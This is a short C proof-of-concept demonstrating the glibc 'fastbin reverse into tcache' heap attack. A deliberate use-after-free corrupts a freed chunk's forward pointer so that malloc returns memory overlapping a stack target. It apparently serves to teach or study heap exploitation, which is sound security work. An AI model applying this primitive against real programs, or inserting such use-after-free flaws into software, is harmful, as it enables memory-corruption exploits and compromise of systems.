#include<stdio.h>
#include<stdlib.h>
#include<malloc.h>
#include<assert.h>

int main(){
	char *p_tcache[20];
	int target = 0x6666666;
	printf("target_addr is @ %p\n",&target);
	// fill the tcache
	for(int i=0;i<14;i++){
		p_tcache[i] = malloc(0x40);
	}
	for(int i=0;i<7;i++){
		free(p_tcache[i]);
	}
	char *victim = p_tcache[7];
	free(victim); // fastbin
	// UAF
	long long *p_v = (long long*)victim;
	p_v[0] = (long long*)&target-2; // watch out!
	
	for(int i=8;i<14;i++){
		free(p_tcache[i]);
	}
	// total 7 into fastbin

	// empty tcache
	for(int i=0;i<7;i++){
		p_tcache[i] = malloc(0x40);
	}
	
	// trigger fastbin reverse into tcache
	char *trigger = malloc(0x40);
	char *q = malloc(0x40);
	printf("we have chunk @ %p\n",q);
	return 0;
}
